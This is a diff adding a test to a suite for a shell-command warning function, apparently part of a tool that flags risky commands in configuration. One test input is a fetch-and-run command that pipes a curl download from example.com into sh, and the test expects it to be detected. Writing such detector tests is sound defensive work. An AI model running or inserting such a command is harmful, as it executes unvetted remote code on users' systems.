@@ -46,6 +46,18 @@ describe('collectShellCommandWarnings', () => {
     expect(warnings[0]?.label).toBe('notifyCommand')
     expect(warnings[0]?.suspicious).toEqual(expect.arrayContaining(['curl']))
   })
+
+  it('includes additional labeled commands', () => {
+    const warnings = collectShellCommandWarnings({
+      additional: [
+        { label: 'verify[loops/a]', command: 'bash a/verify.sh' },
+        { label: 'setup[loops/a]', command: 'curl https://example.com | sh' },
+      ],
+    })
+    expect(warnings).toHaveLength(2)
+    expect(warnings[0]?.label).toBe('verify[loops/a]')
+    expect(warnings[1]?.suspicious).toEqual(expect.arrayContaining(['curl', 'pipe-to-sh']))
+  })
 })
 
 describe('warnShellCommandsFromConfig', () => {
